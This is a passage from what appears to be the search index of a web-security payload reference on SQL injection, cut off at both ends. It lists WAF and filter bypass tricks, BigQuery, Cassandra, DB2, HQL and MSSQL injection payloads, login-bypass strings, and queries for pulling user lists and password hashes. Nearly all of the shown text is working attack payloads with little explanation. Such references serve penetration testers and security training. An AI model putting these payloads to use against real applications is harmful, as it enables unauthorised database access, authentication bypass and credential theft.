0\nSUBSTR('SQL',1,1) -&gt; SUBSTR('SQL' FROM 1 FOR 1).\nSELECT 1,2,3,4    -&gt; UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d\n</code></pre>"},{"location":"SQL%20Injection/#no-equal","title":"No Equal","text":"<p>Bypass using LIKE/NOT IN/IN/BETWEEN</p> <pre><code>?id=1 and substring(version(),1,1)like(5)\n?id=1 and substring(version(),1,1)not in(4,3)\n?id=1 and substring(version(),1,1)in(4,3)\n?id=1 and substring(version(),1,1) between 3 and 4\n</code></pre>"},{"location":"SQL%20Injection/#case-modification","title":"Case modification","text":"<p>Bypass using uppercase/lowercase (see keyword AND)</p> <pre><code>?id=1 AND 1=1#\n?id=1 AnD 1=1#\n?id=1 aNd 1=1#\n</code></pre> <p>Bypass using keywords case insensitive / Bypass using an equivalent operator</p> <pre><code>AND   -&gt; &amp;&amp;\nOR    -&gt; ||\n=     -&gt; LIKE,REGEXP, BETWEEN, not &lt; and not &gt;\n&gt; X   -&gt; not between 0 and X\nWHERE -&gt; HAVING\n</code></pre>"},{"location":"SQL%20Injection/#obfuscation-by-dbms","title":"Obfuscation by DBMS","text":"<p>MySQL <pre><code>1.UNION SELECT  2   \n3.2UNION    SELECT  2   \n1e0UNION    SELECT  2   \nSELECT\\N/0.e3UNION  SELECT  2   \n1e1AND-0.0UNION SELECT  2   \n1/*!12345UNION/*!31337SELECT/*!table_name*/ \n{ts 1}UNION SELECT.``   1.e.table_name  \nSELECT  $.``    1.e.table_name  \nSELECT{_    .``1.e.table_name}  \nSELECT  LightOS .   ``1.e.table_name    LightOS \nSELECT  information_schema 1337.e.tables    13.37e.table_name   \nSELECT  1   from    information_schema 9.e.table_name\n</code></pre></p> <p>MSSQL <pre><code>.1UNION SELECT  2   \n1.UNION SELECT.2alias   \n1e0UNION    SELECT  2   \n1e1AND-1=0.0UNION   SELECT  2   \nSELECT  0xUNION SELECT  2   \nSELECT\\UNION    SELECT  2   \n\\1UNION SELECT  2   \nSELECT  1FROM[table]WHERE\\1=\\1AND\\1=\\1  \nSELECT\"table_name\"FROM[information_schema].[tables] \n</code></pre></p> <p>Oracle <pre><code>1FUNION SELECT  2   \n1DUNION SELECT  2   \nSELECT  0x7461626c655f6e616d65  FROM    all_tab_tables\nSELECT  CHR(116)    ||  CHR(97) ||  CHR(98) FROM    all_tab_tables\nSELECT%00table_name%00FROM%00all_tab_tables\n</code></pre></p>"},{"location":"SQL%20Injection/#more-mysql-specific","title":"More MySQL specific","text":"<p><code>information_schema.tables</code> alternative</p> <pre><code>select * from mysql.innodb_table_stats;\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\n| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |\n| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |\n...\n+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+\nmysql&gt; show tables in dvwa;\n+----------------+\n| Tables_in_dvwa |\n+----------------+\n| guestbook      |\n| users          |\n+----------------+\n</code></pre> <p>Version Alternative</p> <pre><code>mysql&gt; select @@innodb_version;\n+------------------+\n| @@innodb_version |\n+------------------+\n| 5.6.31           |\n+------------------+\nmysql&gt; select @@version;\n+-------------------------+\n| @@version               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\nmysql&gt; mysql&gt; select version();\n+-------------------------+\n| version()               |\n+-------------------------+\n| 5.6.31-0ubuntu0.15.10.1 |\n+-------------------------+\n</code></pre>"},{"location":"SQL%20Injection/#waf-bypass-for-mysql-using-scientific-notation","title":"WAF bypass for MySQL using scientific notation","text":"<p>Blocked <pre><code>' or ''='\n</code></pre> Working <pre><code>' or 1.e('')='\n</code></pre> Obfuscated query <pre><code>1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2\n</code></pre></p>"},{"location":"SQL%20Injection/#labs","title":"Labs","text":"<ul> <li>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</li> <li>SQL injection vulnerability allowing login bypass</li> <li>SQL injection with filter bypass via XML encoding</li> <li>SQL Labs</li> </ul>"},{"location":"SQL%20Injection/#references","title":"References","text":"<ul> <li>Detect SQLi</li> <li>Manual SQL Injection Discovery Tips</li> <li>NetSPI SQL Injection Wiki</li> <li>MySQL:</li> <li>PentestMonkey's mySQL injection cheat sheet</li> <li>Reiners mySQL injection Filter Evasion Cheatsheet</li> <li>Alternative for Information_Schema.Tables in MySQL</li> <li>The SQL Injection Knowledge base</li> <li>MSSQL:</li> <li>EvilSQL's Error/Union/Blind MSSQL Cheatsheet</li> <li>PentestMonkey's MSSQL SQLi injection Cheat Sheet</li> <li>ORACLE:</li> <li>PentestMonkey's Oracle SQLi Cheatsheet</li> <li>POSTGRESQL:</li> <li>PentestMonkey's Postgres SQLi Cheatsheet</li> <li>Others</li> <li>SQLi Cheatsheet - NetSparker</li> <li>Access SQLi Cheatsheet</li> <li>PentestMonkey's Ingres SQL Injection Cheat Sheet</li> <li>Pentestmonkey's DB2 SQL Injection Cheat Sheet</li> <li>Pentestmonkey's Informix SQL Injection Cheat Sheet</li> <li>SQLite3 Injection Cheat sheet</li> <li>Ruby on Rails (Active Record) SQL Injection Guide</li> <li>ForkBombers SQLMap Tamper Scripts Update</li> <li>SQLi in INSERT worse than SELECT</li> <li>Manual SQL Injection Tips</li> <li>Second Order:</li> <li>Analyzing CVE-2018-6376 \u2013 Joomla!, Second Order SQL Injection</li> <li>Exploiting Second Order SQLi Flaws by using Burp &amp; Custom Sqlmap Tamper</li> <li>Sqlmap:</li> <li>#SQLmap protip @zh4ck</li> <li>WAF:</li> <li>SQLi Optimization and Obfuscation Techniques by Roberto Salgado</li> <li>A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection</li> </ul>"},{"location":"SQL%20Injection/BigQuery%20Injection/","title":"Google BigQuery SQL Injection","text":""},{"location":"SQL%20Injection/BigQuery%20Injection/#summary","title":"Summary","text":"<ul> <li>Detection</li> <li>BigQuery Comment</li> <li>BigQuery Union Based</li> <li>BigQuery Error Based</li> <li>BigQuery Boolean Based</li> <li>BigQuery Time Based</li> <li>References</li> </ul>"},{"location":"SQL%20Injection/BigQuery%20Injection/#detection","title":"Detection","text":"<ul> <li>Use a classic single quote to trigger an error: <code>'</code></li> <li>Identify BigQuery using backtick notation: <code>SELECT .... FROM `` AS ...</code></li> </ul> <pre><code># Gathering project id\nselect @@project_id\n# Gathering all dataset names\nselect schema_name from INFORMATION_SCHEMA.SCHEMATA\n# Gathering data from specific project id &amp; dataset\nselect * from `project_id.dataset_name.table_name`\n</code></pre>"},{"location":"SQL%20Injection/BigQuery%20Injection/#bigquery-comment","title":"BigQuery Comment","text":"<pre><code>select 1#from here it is not working\nselect 1/*between those it is not working*/\n</code></pre>"},{"location":"SQL%20Injection/BigQuery%20Injection/#bigquery-union-based","title":"BigQuery Union Based","text":"<pre><code>UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#\ntrue) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#\ntrue) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#\n' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#\n</code></pre>"},{"location":"SQL%20Injection/BigQuery%20Injection/#bigquery-error-based","title":"BigQuery Error Based","text":"<pre><code># Error based - division by zero\n' OR if(1/(length((select('a')))-1)=1,true,false) OR '\n# Error based - casting: select CAST(@@project_id AS INT64)\ndataset_name.column_name` union all select CAST(@@project_id AS INT64) ORDER BY 1 DESC#\n</code></pre>"},{"location":"SQL%20Injection/BigQuery%20Injection/#bigquery-boolean-based","title":"BigQuery Boolean Based","text":"<pre><code>' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#\n</code></pre>"},{"location":"SQL%20Injection/BigQuery%20Injection/#bigquery-time-based","title":"BigQuery Time Based","text":"<ul> <li>Time based functions does not exist in the BigQuery syntax.</li> </ul>"},{"location":"SQL%20Injection/BigQuery%20Injection/#references","title":"References","text":"<ul> <li>BigQuery SQL Injection Cheat Sheet - Ozgur Alp - Feb 14</li> <li>BigQuery Documentation - Query Syntax</li> <li>BigQuery Documentation - Functions and Operators</li> <li>Akamai Web Application Firewall Bypass Journey: Exploiting \u201cGoogle BigQuery\u201d SQL Injection Vulnerability - By Duc Nguyen The, March 31, 2020</li> </ul>"},{"location":"SQL%20Injection/Cassandra%20Injection/","title":"Cassandra Injection","text":"<p>Apache Cassandra is a free and open-source distributed wide column store NoSQL database management system</p>"},{"location":"SQL%20Injection/Cassandra%20Injection/#summary","title":"Summary","text":"<ul> <li>Cassandra comment</li> <li>Cassandra - Login Bypass</li> <li>Login Bypass 0</li> <li>Login Bypass 1</li> <li>References </li> </ul>"},{"location":"SQL%20Injection/Cassandra%20Injection/#cassandra-comment","title":"Cassandra comment","text":"<pre><code>/* Cassandra Comment */\n</code></pre>"},{"location":"SQL%20Injection/Cassandra%20Injection/#cassandra-login-bypass","title":"Cassandra - Login Bypass","text":""},{"location":"SQL%20Injection/Cassandra%20Injection/#login-bypass-0","title":"Login Bypass 0","text":"<pre><code>username: admin' ALLOW FILTERING; %00\npassword: ANY\n</code></pre>"},{"location":"SQL%20Injection/Cassandra%20Injection/#login-bypass-1","title":"Login Bypass 1","text":"<pre><code>username: admin'/*\npassword: */and pass&gt;'\n</code></pre> <p>The injection would look like the following SQL query</p> <pre><code>SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass&gt;'' ALLOW FILTERING;\n</code></pre>"},{"location":"SQL%20Injection/Cassandra%20Injection/#references","title":"References","text":""},{"location":"SQL%20Injection/DB2%20Injection/","title":"DB2 Injection","text":""},{"location":"SQL%20Injection/DB2%20Injection/#summary","title":"Summary","text":"<ul> <li>DB2 Cheatsheet</li> <li>References </li> </ul>"},{"location":"SQL%20Injection/DB2%20Injection/#db2-cheatsheet","title":"DB2 Cheatsheet","text":""},{"location":"SQL%20Injection/DB2%20Injection/#version","title":"Version","text":"<pre><code>select versionnumber, version_timestamp from sysibm.sysversions;\nselect service_level from table(sysproc.env_get_inst_info()) as instanceinfo\nselect getvariable('sysibm.version') from sysibm.sysdummy1 -- (v8+)\nselect prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo\nselect service_level,bld_level from sysibmadm.env_inst_info\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#comments","title":"Comments","text":"<pre><code>select blah from foo -- comment like this (double dash)\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#current-user","title":"Current User","text":"<pre><code>select user from sysibm.sysdummy1\nselect session_user from sysibm.sysdummy1\nselect system_user from sysibm.sysdummy1\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#list-users","title":"List Users","text":"<p>DB2 uses OS accounts</p> <pre><code>select distinct(authid) from sysibmadm.privileges -- priv required\nselect grantee from syscat.dbauth -- incomplete results\nselect distinct(definer) from syscat.schemata -- more accurate\nselect distinct(grantee) from sysibm.systabauth -- same as previous\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#list-privileges","title":"List Privileges","text":"<pre><code>select * from syscat.tabauth -- shows priv on tables\nselect * from syscat.tabauth where grantee = current user -- shows privs for current user\nselect * from syscat.dbauth where grantee = current user;;\nselect * from SYSIBM.SYSUSERAUTH \u2014 List db2 system privilegies\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#list-dba-accounts","title":"List DBA Accounts","text":"<pre><code>select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'\nselect name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = \u2018Y\u2019 or SYSADMAUTH = \u2018G\u2019\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#current-database","title":"Current Database","text":"<pre><code>select current server from sysibm.sysdummy1\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#list-databases","title":"List Databases","text":"<pre><code>select distinct(table_catalog) from sysibm.tables\nSELECT schemaname FROM syscat.schemata;\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#list-columns","title":"List Columns","text":"<pre><code>select name, tbname, coltype from sysibm.syscolumns -- also valid syscat and sysstat\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#list-tables","title":"List Tables","text":"<pre><code>select table_name from sysibm.tables\nselect name from sysibm.systables\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#find-tables-from-column-name","title":"Find Tables From Column Name","text":"<pre><code>select tbname from sysibm.syscolumns where name='username'\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#select-nth-row","title":"Select Nth Row","text":"<pre><code>select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#select-nth-char","title":"Select Nth Char","text":"<pre><code>select substr('abc',2,1) FROM sysibm.sysdummy1 -- returns b\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#bitwise-andornotxor","title":"Bitwise AND/OR/NOT/XOR","text":"<pre><code>select bitand(1,0) from sysibm.sysdummy1 -- returns 0. Also available bitandnot, bitor, bitxor, bitnot\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#ascii-value","title":"ASCII Value","text":"<pre><code>Char    select chr(65) from sysibm.sysdummy1 -- returns 'A'\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#char-ascii-value","title":"Char -&gt; ASCII Value","text":"<pre><code>select ascii('A') from sysibm.sysdummy1 -- returns 65\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#casting","title":"Casting","text":"<pre><code>select cast('123' as integer) from sysibm.sysdummy1\nselect cast(1 as char) from sysibm.sysdummy1\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#string-concat","title":"String Concat","text":"<pre><code>select 'a' concat 'b' concat 'c' from sysibm.sysdummy1 -- returns 'abc'\nselect 'a' || 'b' from sysibm.sysdummy1 -- returns 'ab'\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#if-statement","title":"IF Statement","text":"<p>Seems only allowed in stored procedures. Use case logic instead.</p>"},{"location":"SQL%20Injection/DB2%20Injection/#case-statement","title":"Case Statement","text":"<pre><code>select CASE WHEN (1=1) THEN 'AAAAAAAAAA' ELSE 'BBBBBBBBBB' END from sysibm.sysdummy1\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#avoiding-quotes","title":"Avoiding Quotes","text":"<pre><code>SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1 -- returns \u201cADRI\u201d. Works without select too\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#time-delay","title":"Time Delay","text":"<p>Heavy queries, for example: If user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response.  However, if user doesn't start with ascii 68, the heavy query won't execute and thus the response will be faster. <pre><code>' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)&gt;0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 </code></pre></p>"},{"location":"SQL%20Injection/DB2%20Injection/#serialize-to-xml-for-error-based","title":"Serialize to XML (for error based)","text":"<pre><code>select xmlagg(xmlrow(table_schema)) from sysibm.tables -- returns all in one xml-formatted string\nselect xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) -- Same but without repeated elements\nselect xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- returns all in one xml-formatted string (v8). May need CAST(xml2clob(\u2026 AS varchar(500)) to display the result.\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#command-execution-and-local-file-access","title":"Command Execution and Local File Access","text":"<p>Seems it's only allowed from procedures or UDFs.</p>"},{"location":"SQL%20Injection/DB2%20Injection/#hostnameip-and-os-info","title":"Hostname/IP and OS INFO","text":"<pre><code>select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info -- requires priv\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#location-of-db-files","title":"Location of DB Files","text":"<pre><code>select * from sysibmadm.reg_variables where reg_var_name='DB2PATH' -- requires priv\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#system-config","title":"System Config","text":"<pre><code>select dbpartitionnum, name, value from sysibmadm.dbcfg where name like 'auto_%' -- Requires priv. Retrieve the automatic maintenance settings in the database configuration that are stored in memory for all database partitions.\nselect name, deferred_value, dbpartitionnum from sysibmadm.dbcfg -- Requires priv. Retrieve all the database configuration parameters values stored on disk for all database partitions.\n</code></pre>"},{"location":"SQL%20Injection/DB2%20Injection/#default-system-database","title":"Default System Database","text":"<ul> <li>SYSIBM</li> <li>SYSCAT</li> <li>SYSSTAT</li> <li>SYSPUBLIC</li> <li>SYSIBMADM</li> <li>SYSTOOLs</li> </ul>"},{"location":"SQL%20Injection/DB2%20Injection/#references","title":"References","text":"<ul> <li>DB2 SQL injection cheat sheet - Adri\u00e1n - 20/05/2012</li> <li>DB2 SQL Injection Cheat Sheet - pentestmonkey</li> </ul>"},{"location":"SQL%20Injection/HQL%20Injection/","title":"Hibernate Query Language Injection","text":"<p>Hibernate ORM (Hibernate in short) is an object-relational mapping tool for the Java programming language. It provides a framework for mapping an object-oriented domain model to a relational database. - Wikipedia</p>"},{"location":"SQL%20Injection/HQL%20Injection/#summary","title":"Summary","text":"<ul> <li>HQL Comments</li> <li>HQL List Columns</li> <li>HQL Error Based</li> <li>Single Quote Escaping</li> <li>$-quoted strings</li> <li>DBMS Magic functions</li> <li>Unicode</li> <li>Java constants</li> <li>Methods by DBMS</li> <li>References</li> </ul> <p> Your input will always be between the percentage symbols: <code>%INJECT_HERE%</code></p>"},{"location":"SQL%20Injection/HQL%20Injection/#hql-comments","title":"HQL Comments","text":"<pre><code>HQL does not support comments\n</code></pre>"},{"location":"SQL%20Injection/HQL%20Injection/#hql-list-columns","title":"HQL List Columns","text":"<pre><code>from BlogPosts\nwhere title like '%'\nand DOESNT_EXIST=1 and ''='%' -- \nand published = true\n</code></pre> <p>Using an unexisting column will an exception leaking several columns names.</p> <pre><code>org.hibernate.exception.SQLGrammarException: Column \"DOESNT_EXIST\" not found; SQL statement:\nselect blogposts0_.id as id21_, blogposts0_.author as author21_, blogposts0_.promoCode as promo3_21_, blogposts0_.title as title21_, blogposts0_.published as published21_ from BlogPosts blogposts0_ where blogposts0_.title like '%' or DOESNT_EXIST='%' and blogposts0_.published=1 [42122-159]\n</code></pre>"},{"location":"SQL%20Injection/HQL%20Injection/#hql-error-based","title":"HQL Error Based","text":"<pre><code>from BlogPosts\nwhere title like '%11'\nand (select password from User where username='admin')=1\nor ''='%'\nand published = true\n</code></pre> <p>Error based on value casting.</p> <pre><code>Data conversion error converting \"d41d8cd98f00b204e9800998ecf8427e\"; SQL statement:\nselect blogposts0_.id as id18_, blogposts0_.author as author18_, blogposts0_.promotionCode as promotio3_18_, blogposts0_.title as title18_, blogposts0_.visible as visible18_ from BlogPosts blogposts0_ where blogposts0_.title like '%11' and (select user1_.password from User user1_ where user1_.username = 'admin')=1 or ''='%' and blogposts0_.published=1\n</code></pre> <p> HQL does not support UNION queries</p>"},{"location":"SQL%20Injection/HQL%20Injection/#single-quote-escaping","title":"Single Quote Escaping","text":"<p>Method works for MySQL DBMS which escapes SINGLE QUOTES in strings with SLASH <code>\\'</code>.</p> <p>In HQL SINGLE QUOTES is escaped in strings by doubling <code>''</code>.</p> <pre><code>'abc\\''or 1=(select 1)--'\n</code></pre> <p>In HQL it is a string, in MySQL it is a string and additional SQL expression.</p>"},{"location":"SQL%20Injection/HQL%20Injection/#-quoted-strings","title":"$-quoted strings","text":"<p>Method works for DBMS which allow DOLLAR-QUOTED strings in SQL expressions: PostgreSQL, H2.</p> <p>Hibernate ORM allows identifiers starting with <code>$$</code>.</p> <pre><code>$$='$$=concat(chr(61),chr(39)) and 1=1--'\n</code></pre>"},{"location":"SQL%20Injection/HQL%20Injection/#dbms-magic-functions","title":"DBMS Magic functions","text":"<p>Method works for DBMS which have MAGIC FUNCTIONS which evaluate SQL expression in string parameter: PostgreSQL, Oracle.</p> <p>Hibernate allows to specify any function name in HQL expression.</p> <p>PostgreSQL has built-in function <code>query_to_xml('Arbitrary SQL')</code>.</p> <pre><code>array_upper(xpath('row',query_to_xml('select 1 where 1337&gt;1', true, false,'')),1)\n</code></pre> <p>Oracle has built-in function <code>DBMS_XMLGEN.getxml('SQL')</code></p> <pre><code>NVL(TO_CHAR(DBMS_XMLGEN.getxml('select 1 where 1337&gt;1')),'1')!='1'\n</code></pre>"},{"location":"SQL%20Injection/HQL%20Injection/#unicode","title":"Unicode","text":"<p>Method works for DBMS which allow UNICODE delimiters (Ex. U+00A0) between SQL tokens: Microsoft SQL Server, H2.</p> <p>In Microsoft SQL SERVER <code>SELECT LEN([U+00A0](select[U+00A0](1))</code> works the same as <code>SELECT LEN((SELECT(1)))</code>;</p> <p>HQL allows UNICODE symbols in identifiers (function or parameter names).</p> <pre><code>SELECT p FROM hqli.persistent.Post p where p.name='dummy' or 1&lt;LEN( (select top 1 name from users)) or '1'='11'\n</code></pre>"},{"location":"SQL%20Injection/HQL%20Injection/#java-constants","title":"Java constants","text":"<p>Method works for most DBMS (does not work for MySQL).</p> <p>Hibernate resolves Java public static fields (Java constants) in HQL queries:</p> <ul> <li>Class with Java constant must be in classpath</li> <li>Ex. <code>java.lang.Character.SIZE</code> is resolved to 16</li> <li>String or char constants are additionally surrounded by single quotes</li> </ul> <p>To use JAVA CONSTANTS method we need special char or  string fields declared in classes or interfaces on classpath.</p> <pre><code>public class Constants {\npublic static final String S_QUOTE = \"'\";\npublic static final String HQL_PART = \"select * from Post where name = '\";\npublic static final char C_QUOTE_1 = '\\'';\npublic static final char C_QUOTE_2 = '\\047';\npublic static final char C_QUOTE_3 = 39;\npublic static final char C_QUOTE_4 = 0x27;\npublic static final char C_QUOTE_5 = 047;\n}\n</code></pre> <p>Some usable constants in well-known Java libraries:</p> <pre><code>org.apache.batik.util.XMLConstants.XML_CHAR_APOS         [ Apache Batik ]\ncom.ibm.icu.impl.PatternTokenizer.SINGLE_QUOTE           [ ICU4J ]\njodd.util.StringPool.SINGLE_QUOTE                        [ Jodd ]\nch.qos.logback.core.CoreConstants.SINGLE_QUOTE_CHAR      [ Logback ]\ncz.vutbr.web.csskit.OutputUtil.STRING_OPENING            [ jStyleParser ]\ncom.sun.java.help.impl.DocPConst.QUOTE                   [ JavaHelp ]\norg.eclipse.help.internal.webapp.utils.JSonHelper.QUOTE  [ EclipseHelp ]\n</code></pre> <pre><code>dummy' and hqli.persistent.Constants.C_QUOTE_1*X('&lt;&gt;CHAR(41) and (select count(1) from sysibm.sysdummy1)&gt;0 --')=1 and '1'='1\n</code></pre>"},{"location":"SQL%20Injection/HQL%20Injection/#methods-by-dbms","title":"Methods by DBMS","text":""},{"location":"SQL%20Injection/HQL%20Injection/#references","title":"References","text":"<ul> <li>HQL for pentesters - February 12, 2014 - Philippe Arteau</li> <li>How to put a comment into HQL (Hibernate Query Language)? - Thomas Bratt</li> <li>HQL : Hyperinsane Query Language - 04/06/2015 - Renaud Dubourguais</li> <li>ORM2Pwn: Exploiting injections in Hibernate ORM - Nov 26, 2015 - Mikhail Egorov</li> <li>New Methods for Exploiting ORM Injections in Java Applications - HITBSecConf2016 - Mikhail Egorov - Sergey Soldatov</li> <li>HQL Injection Exploitation in MySQL - July 18, 2019 - Olga Barinova</li> </ul>"},{"location":"SQL%20Injection/MSSQL%20Injection/","title":"MSSQL Injection","text":""},{"location":"SQL%20Injection/MSSQL%20Injection/#summary","title":"Summary","text":"<ul> <li>MSSQL Comments</li> <li>MSSQL User</li> <li>MSSQL Version</li> <li>MSSQL Hostname</li> <li>MSSQL Database name</li> <li>MSSQL List databases</li> <li>MSSQL List columns</li> <li>MSSQL List tables</li> <li>MSSQL Extract user/password</li> <li>MSSQL Union Based</li> <li>MSSQL Error Based</li> <li>MSSQL Blind Based</li> <li>MSSQL Time Based</li> <li>MSSQL Stacked query</li> <li>MSSQL Read file</li> <li>MSSQL Command execution</li> <li>MSSQL Out of band<ul> <li>MSSQL DNS exfiltration</li> <li>MSSQL UNC path</li> </ul> </li> <li>MSSQL Make user DBA</li> <li>MSSQL Trusted Links</li> <li>MSSQL List permissions</li> </ul>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-comments","title":"MSSQL Comments","text":"<pre><code>-- comment goes here\n/* comment goes here */\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-user","title":"MSSQL User","text":"<pre><code>SELECT CURRENT_USER\nSELECT user_name();\nSELECT system_user;\nSELECT user;\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-version","title":"MSSQL version","text":"<pre><code>SELECT @@version\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-hostname","title":"MSSQL Hostname","text":"<pre><code>SELECT HOST_NAME()\nSELECT @@hostname;\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-database-name","title":"MSSQL Database name","text":"<pre><code>SELECT DB_NAME()\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-list-databases","title":"MSSQL List databases","text":"<pre><code>SELECT name FROM master..sysdatabases;\nSELECT DB_NAME(N); \u2014 for N = 0, 1, 2, \u2026\nSELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want =&gt; master, tempdb, model, msdb   (Only works in MSSQL 2017+)\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-list-columns","title":"MSSQL List columns","text":"<pre><code>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = \u2018mytable\u2019); \u2014 for the current DB only\nSELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable\nSELECT table_catalog, column_name FROM information_schema.columns\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-list-tables","title":"MSSQL List tables","text":"<pre><code>SELECT name FROM master..sysobjects WHERE xtype = \u2018U\u2019; \u2014 use xtype = \u2018V\u2019 for views\nSELECT name FROM someotherdb..sysobjects WHERE xtype = \u2018U\u2019;\nSELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable\nSELECT table_catalog, table_name FROM information_schema.columns\nSELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want =&gt; trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-extract-userpassword","title":"MSSQL Extract user/password","text":"<pre><code>MSSQL 2000:\nSELECT name, password FROM master..sysxlogins\nSELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins (Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.)\nMSSQL 2005\nSELECT name, password_hash FROM master.sys.sql_logins\nSELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-union-based","title":"MSSQL Union Based","text":"<pre><code>-- extract databases names\n$ SELECT name FROM master..sysdatabases\n[*] Injection\n[*] msdb\n[*] tempdb\n-- extract tables from Injection database\n$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'\n[*] Profiles\n[*] Roles\n[*] Users\n-- extract columns for the table Users\n$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')\n[*] UserId\n[*] UserName\n-- Finally extract the data\n$ SELECT  UserId, UserName from Users\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-error-based","title":"MSSQL Error based","text":"<pre><code>For integer inputs : convert(int,@@version)\nFor integer inputs : cast((SELECT @@version) as int)\nFor string inputs   : ' + convert(int,@@version) + '\nFor string inputs   : ' + cast((SELECT @@version) as int) + '\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-blind-based","title":"MSSQL Blind based","text":"<pre><code>AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -\nAND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97\nAND UNICODE(SUBSTRING((SELECT 'A'),1,1))&gt;64-- \nAND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)&gt;90\nSELECT @@version WHERE @@version LIKE '%12.0.2000.8%'\nWITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)\nSELECT message FROM data WHERE row = 1 and message like 't%'\n</code></pre>"},{"location":"SQL%20Injection/MSSQL%20Injection/#mssql-time-based","title":"MSSQL Time based","text":"<pre><code>ProductID=1;waitfor delay 